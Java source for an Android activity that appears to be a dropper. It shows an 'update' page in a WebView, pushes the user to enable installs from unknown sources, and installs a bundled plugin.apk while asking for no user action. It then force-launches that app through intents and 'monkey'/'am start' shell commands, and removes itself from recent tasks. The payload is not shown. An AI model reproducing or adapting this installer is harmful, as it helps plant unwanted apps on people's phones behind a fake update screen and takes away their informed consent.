package com.example.installer;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.util.TypedValue;
import android.view.View;
import android.view.WindowInsetsController;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;

public class MainActivity extends Activity {

    private static final String TAG = "MainActivity";
    private static final String APK_NAME = "plugin.apk";
    private static final int REQUEST_INSTALL = 100;
    private static final String ACTION_INSTALL = "com.example.installer.INSTALL";

    private WebView webView;
    private String packageName = null;
    private String mainActivity = null;
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean isInstalling = false;

    private BroadcastReceiver installReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            int status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, -1);
            Log.d(TAG, "installReceiver: Received status: " + status);

            switch (status) {
                case PackageInstaller.STATUS_PENDING_USER_ACTION:
                    Log.d(TAG, "installReceiver: Pending user action");
                    Intent confirmIntent = intent.getParcelableExtra(Intent.EXTRA_INTENT);
                    if (confirmIntent != null) {
                        Log.d(TAG, "installReceiver: Starting confirmation intent");
                        startActivity(confirmIntent);
                    } else {
                        Log.w(TAG, "installReceiver: Confirm intent is null");
                    }
                    break;

                case PackageInstaller.STATUS_SUCCESS:
                    Log.d(TAG, "installReceiver: Installation successful");
                    handler.post(new Runnable() {
                        @Override
                        public void run() {
                            toast("Installed!");
                        }
                    });
                    handler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            Log.d(TAG, "installReceiver: Opening installed app");
                            forceOpenApp();
                        }
                    }, 500);
                    break;

                default:
                    Log.e(TAG, "installReceiver: Installation failed with status: " + status);
                    String message = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);
                    Log.e(TAG, "installReceiver: Error message: " + message);
                    handler.post(new Runnable() {
                        @Override
                        public void run() {
                            isInstalling = false;
                            toast("Installation failed");
                            webView.loadUrl("file:///android_asset/update/update.html?error=true");
                        }
                    });
                    break;
            }
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "onCreate: Starting");

        try {
            Log.d(TAG, "onCreate: Setting up system bars");
            setupSystemBars();
            Log.d(TAG, "onCreate: System bars set up successfully");
        } catch (Exception e) {
            Log.e(TAG, "onCreate: Error in setupSystemBars", e);
        }

        try {
            Log.d(TAG, "onCreate: Registering receiver");
            registerReceiver(installReceiver, new IntentFilter(ACTION_INSTALL));
            Log.d(TAG, "onCreate: Receiver registered successfully");
        } catch (Exception e) {
            Log.e(TAG, "onCreate: Error registering receiver", e);
        }

        try {
            Log.d(TAG, "onCreate: Creating WebView");
            webView = new WebView(this);
            android.webkit.WebSettings settings = webView.getSettings();
            settings.setJavaScriptEnabled(true);
            settings.setDomStorageEnabled(true);
            settings.setAllowFileAccess(true);
            settings.setAllowContentAccess(true);
            settings.setMediaPlaybackRequiresUserGesture(false);
            settings.setJavaScriptCanOpenWindowsAutomatically(true);

            webView.setWebViewClient(new WebViewClient() {
                @Override
                public void onPageFinished(WebView view, String url) {
                    super.onPageFinished(view, url);
                    Log.d(TAG, "WebView: Page finished loading: " + url);
                }

                @Override
                public boolean shouldOverrideUrlLoading(WebView view, String url) {
                    Log.d(TAG, "WebView: URL loading: " + url);
                    return false;
                }

                @Override
                public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
                    super.onReceivedError(view, errorCode, description, failingUrl);
                    Log.e(TAG, "WebView: Error loading page - Code: " + errorCode + ", Desc: " + description + ", URL: " + failingUrl);
                }
            });

            webView.setWebChromeClient(new WebChromeClient());
            Log.d(TAG, "onCreate: WebView created successfully");

            Log.d(TAG, "onCreate: Adding JavaScript interface");
            webView.addJavascriptInterface(new WebAppInterface(), "Android");

            Log.d(TAG, "onCreate: Setting content view");
            setContentView(webView);

            if (checkAssetExists("update/update.html")) {
                Log.d(TAG, "onCreate: Loading update.html");
                webView.loadUrl("file:///android_asset/update/update.html");
            } else {
                Log.e(TAG, "onCreate: update.html not found, showing error page");
                showErrorPage();
            }
            Log.d(TAG, "onCreate: Completed successfully");
        } catch (Exception e) {
            Log.e(TAG, "onCreate: Critical error", e);
            finish();
        }
    }

    private boolean checkAssetExists(String assetPath) {
        try {
            InputStream inputStream = getAssets().open(assetPath);
            inputStream.close();
            return true;
        } catch (Exception e) {
            Log.e(TAG, "checkAssetExists: Asset not found - " + assetPath, e);
            return false;
        }
    }

    private void showErrorPage() {
        String html = "<!DOCTYPE html>" +
                "<html>" +
                "<head>" +
                "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">" +
                "<style>" +
                "body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: white; }" +
                "h1 { color: #333; }" +
                "p { color: #666; }" +
                "</style>" +
                "</head>" +
                "<body>" +
                "<h1>Error</h1>" +
                "<p>Application resources not found.</p>" +
                "</body>" +
                "</html>";
        webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null);
    }

    class WebAppInterface {
        @JavascriptInterface
        public void installPlugin() {
            Log.d(TAG, "WebAppInterface: installPlugin called");
            handler.post(new Runnable() {
                @Override
                public void run() {
                    if (!isInstalling) {
                        Log.d(TAG, "WebAppInterface: Starting installation");
                        checkPermission();
                    } else {
                        Log.w(TAG, "WebAppInterface: Installation already in progress");
                    }
                }
            });
        }

        @JavascriptInterface
        public void onInstallComplete() {
            Log.d(TAG, "WebAppInterface: onInstallComplete called");
            handler.post(new Runnable() {
                @Override
                public void run() {
                    webView.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            webView.loadUrl("file:///android_asset/update/update.html?installed=true");
                        }
                    }, 1000);
                }
            });
        }
    }

    private void checkPermission() {
        Log.d(TAG, "checkPermission: Checking install permission");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (!getPackageManager().canRequestPackageInstalls()) {
                Log.d(TAG, "checkPermission: Permission not granted, requesting");
                Intent intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, REQUEST_INSTALL);
                return;
            }
            Log.d(TAG, "checkPermission: Permission already granted");
        }
        Log.d(TAG, "checkPermission: Starting install");
        install();
    }

    private void install() {
        Log.d(TAG, "install: Starting installation process");
        if (isInstalling) {
            Log.w(TAG, "install: Already installing, returning");
            return;
        }

        isInstalling = true;

        handler.post(new Runnable() {
            @Override
            public void run() {
                if (checkAssetExists("update/installing.html")) {
                    Log.d(TAG, "install: Loading installing.html");
                    webView.loadUrl("file:///android_asset/update/installing.html");
                } else {
                    Log.e(TAG, "install: installing.html not found");
                }
            }
        });

        new Thread(new Runnable() {
            @Override
            public void run() {
                PackageInstaller.Session session = null;
                try {
                    Log.d(TAG, "install: Reading APK info");
                    readApkInfo();

                    if (packageName == null) {
                        Log.e(TAG, "install: Failed to read package name");
                        handler.post(new Runnable() {
                            @Override
                            public void run() {
                                isInstalling = false;
                                toast("Cannot read APK");
                                webView.loadUrl("file:///android_asset/update/update.html?error=apk");
                            }
                        });
                        return;
                    }

                    Log.d(TAG, "install: Package name: " + packageName + ", Main activity: " + mainActivity);

                    Log.d(TAG, "install: Creating installer session");
                    PackageInstaller installer = getPackageManager().getPackageInstaller();

                    PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                            PackageInstaller.SessionParams.MODE_FULL_INSTALL);

                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                        params.setRequireUserAction(
                                PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED);
                    }

                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        params.setInstallReason(PackageManager.INSTALL_REASON_USER);
                    }

                    int sessionId = installer.createSession(params);
                    Log.d(TAG, "install: Session created with ID: " + sessionId);

                    session = installer.openSession(sessionId);

                    if (!checkAssetExists(APK_NAME)) {
                        Log.e(TAG, "install: " + APK_NAME + " not found in assets");
                        handler.post(new Runnable() {
                            @Override
                            public void run() {
                                isInstalling = false;
                                toast("APK file not found");
                                webView.loadUrl("file:///android_asset/update/update.html?error=apk");
                            }
                        });
                        return;
                    }

                    Log.d(TAG, "install: Writing APK to session");
                    OutputStream out = session.openWrite("package", 0, -1);
                    InputStream in = getAssets().open(APK_NAME);

                    byte[] buffer = new byte[65536];
                    int read;
                    long totalBytes = 0;
                    while ((read = in.read(buffer)) != -1) {
                        out.write(buffer, 0, read);
                        totalBytes += read;
                    }
                    Log.d(TAG, "install: Written " + totalBytes + " bytes to session");
                    session.fsync(out);
                    in.close();
                    out.close();

                    Log.d(TAG, "install: Creating PendingIntent");
                    Intent intent = new Intent(ACTION_INSTALL);

                    int flags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.S ?
                            PendingIntent.FLAG_MUTABLE : PendingIntent.FLAG_UPDATE_CURRENT;

                    PendingIntent sender = PendingIntent.getBroadcast(
                            MainActivity.this, sessionId, intent, flags);

                    Log.d(TAG, "install: Committing session");
                    session.commit(sender.getIntentSender());
                    Log.d(TAG, "install: Session committed successfully");

                } catch (Exception e) {
                    Log.e(TAG, "install: Exception during installation", e);
                    if (session != null) {
                        try {
                            session.abandon();
                        } catch (Exception ex) {
                            // Ignore
                        }
                    }
                    handler.post(new Runnable() {
                        @Override
                        public void run() {
                            isInstalling = false;
                            toast("Failed!");
                            webView.loadUrl("file:///android_asset/update/update.html?error=install");
                        }
                    });
                }
            }
        }).start();
    }

    private void readApkInfo() {
        try {
            Log.d(TAG, "readApkInfo: Checking if " + APK_NAME + " exists");
            if (!checkAssetExists(APK_NAME)) {
                Log.e(TAG, "readApkInfo: " + APK_NAME + " not found");
                return;
            }

            File tempFile = new File(getCacheDir(), "temp.apk");
            Log.d(TAG, "readApkInfo: Copying APK to temp file: " + tempFile.getAbsolutePath());

            OutputStream out = new FileOutputStream(tempFile);
            InputStream in = getAssets().open(APK_NAME);

            byte[] buffer = new byte[8192];
            int read;
            long totalBytes = 0;
            while ((read = in.read(buffer)) != -1) {
                out.write(buffer, 0, read);
                totalBytes += read;
            }
            Log.d(TAG, "readApkInfo: Copied " + totalBytes + " bytes");
            in.close();
            out.close();

            if (!tempFile.exists() || tempFile.length() == 0) {
                Log.e(TAG, "readApkInfo: Temp file is empty or doesn't exist");
                tempFile.delete();
                return;
            }

            Log.d(TAG, "readApkInfo: Reading package info from temp file");
            PackageManager pm = getPackageManager();
            android.content.pm.PackageInfo info = pm.getPackageArchiveInfo(
                    tempFile.getAbsolutePath(),
                    PackageManager.GET_ACTIVITIES);

            if (info == null) {
                Log.e(TAG, "readApkInfo: Failed to get package archive info");
            } else {
                packageName = info.packageName;
                Log.d(TAG, "readApkInfo: Package name: " + packageName);

                if (info.activities != null && info.activities.length > 0) {
                    mainActivity = info.activities[0].name;
                    Log.d(TAG, "readApkInfo: Main activity: " + mainActivity);
                } else {
                    Log.w(TAG, "readApkInfo: No activities found");
                }
            }

            tempFile.delete();

        } catch (Exception e) {
            Log.e(TAG, "readApkInfo: Exception", e);
        }
    }

    private void forceOpenApp() {
        Log.d(TAG, "forceOpenApp: Starting to open installed app");
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Log.d(TAG, "forceOpenApp: Waiting 800ms");
                    Thread.sleep(800);

                    Log.d(TAG, "forceOpenApp: Trying method 1 (ComponentName)");
                    tryMethod1();
                    Thread.sleep(300);

                    Log.d(TAG, "forceOpenApp: Trying method 2 (monkey)");
                    tryMethod2();
                    Thread.sleep(300);

                    Log.d(TAG, "forceOpenApp: Trying method 3 (am start)");
                    tryMethod3();
                    Thread.sleep(300);

                    Log.d(TAG, "forceOpenApp: Trying method 4 (getLaunchIntent)");
                    tryMethod4();

                    handler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            Log.d(TAG, "forceOpenApp: Finishing MainActivity");
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                                finishAndRemoveTask();
                            } else {
                                finish();
                            }
                        }
                    }, 1000);

                } catch (Exception e) {
                    Log.e(TAG, "forceOpenApp: Exception", e);
                }
            }
        }).start();
    }

    private void tryMethod1() {
        try {
            if (packageName == null || mainActivity == null) return;

            Intent intent = new Intent();
            intent.setComponent(new ComponentName(packageName, mainActivity));
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);

            startActivity(intent);
        } catch (Exception e) {
            // Ignore
        }
    }

    private void tryMethod2() {
        try {
            if (packageName == null) return;

            String cmd = "monkey -p " + packageName + " 1";
            Process process = Runtime.getRuntime().exec(cmd);
            process.waitFor();
        } catch (Exception e) {
            // Ignore
        }
    }

    private void tryMethod3() {
        try {
            if (packageName == null || mainActivity == null) return;

            String cmd = "am start -n " + packageName + "/" + mainActivity;
            Process process = Runtime.getRuntime().exec(cmd);
            process.waitFor();
        } catch (Exception e) {
            // Ignore
        }
    }

    private void tryMethod4() {
        try {
            if (packageName == null) return;

            PackageManager pm = getPackageManager();
            Intent intent = pm.getLaunchIntentForPackage(packageName);

            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            }
        } catch (Exception e) {
            // Ignore
        }
    }

    private void setupSystemBars() {
        try {
            android.view.Window window = getWindow();

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                try {
                    window.setStatusBarColor(Color.WHITE);
                    window.setNavigationBarColor(Color.WHITE);

                    WindowInsetsController controller = window.getInsetsController();
                    if (controller != null) {
                        controller.setSystemBarsAppearance(
                                WindowInsetsController.APPEARANCE_LIGHT_STATUS_BARS,
                                WindowInsetsController.APPEARANCE_LIGHT_STATUS_BARS);
                        controller.setSystemBarsAppearance(
                                WindowInsetsController.APPEARANCE_LIGHT_NAVIGATION_BARS,
                                WindowInsetsController.APPEARANCE_LIGHT_NAVIGATION_BARS);
                    }
                } catch (Exception e) {
                    // Ignore
                }
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                try {
                    window.setStatusBarColor(Color.WHITE);
                    window.setNavigationBarColor(Color.WHITE);

                    int flags = window.getDecorView().getSystemUiVisibility();
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        flags |= View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR;
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
                        flags |= View.SYSTEM_UI_FLAG_LIGHT_NAVIGATION_BAR;
                    }
                    window.getDecorView().setSystemUiVisibility(flags);
                } catch (Exception e) {
                    // Ignore
                }
            }
        } catch (Exception e) {
            // Ignore
        }
    }

    @Override
    public void onBackPressed() {
        Log.d(TAG, "onBackPressed: Called");
        try {
            if (webView != null && webView.canGoBack()) {
                Log.d(TAG, "onBackPressed: WebView can go back");
                webView.goBack();
            } else {
                Log.d(TAG, "onBackPressed: Finishing activity");
                super.onBackPressed();
            }
        } catch (Exception e) {
            Log.e(TAG, "onBackPressed: Exception", e);
            super.onBackPressed();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        Log.d(TAG, "onActivityResult: requestCode=" + requestCode + ", resultCode=" + resultCode);

        if (requestCode == REQUEST_INSTALL) {
            Log.d(TAG, "onActivityResult: Checking install permission result");
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        if (getPackageManager().canRequestPackageInstalls()) {
                            Log.d(TAG, "onActivityResult: Permission granted, starting install");
                            install();
                        } else {
                            Log.e(TAG, "onActivityResult: Permission denied by user");
                            toast("Permission denied");
                            isInstalling = false;
                            if (webView != null) {
                                webView.loadUrl("file:///android_asset/update/update.html?error=permission");
                            }
                        }
                    }
                }
            }, 300);
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        Log.d(TAG, "onResume: Checking if permission was granted");

        // Check if user came back from settings and granted permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (getPackageManager().canRequestPackageInstalls() && !isInstalling) {
                Log.d(TAG, "onResume: Permission granted, starting install");
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        install();
                    }
                }, 300);
            }
        }
    }

    @Override
    protected void onDestroy() {
        Log.d(TAG, "onDestroy: Starting");
        super.onDestroy();
        try {
            Log.d(TAG, "onDestroy: Unregistering receiver");
            unregisterReceiver(installReceiver);
        } catch (Exception e) {
            Log.e(TAG, "onDestroy: Error unregistering receiver", e);
        }
        try {
            if (webView != null) {
                Log.d(TAG, "onDestroy: Destroying WebView");
                webView.destroy();
            }
        } catch (Exception e) {
            Log.e(TAG, "onDestroy: Error destroying WebView", e);
        }
        Log.d(TAG, "onDestroy: Completed");
    }

    private void toast(String msg) {
        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show();
    }

    private int dp(int d) {
        return (int) TypedValue.applyDimension(
                TypedValue.COMPLEX_UNIT_DIP,
                d,
                getResources().getDisplayMetrics());
    }
}

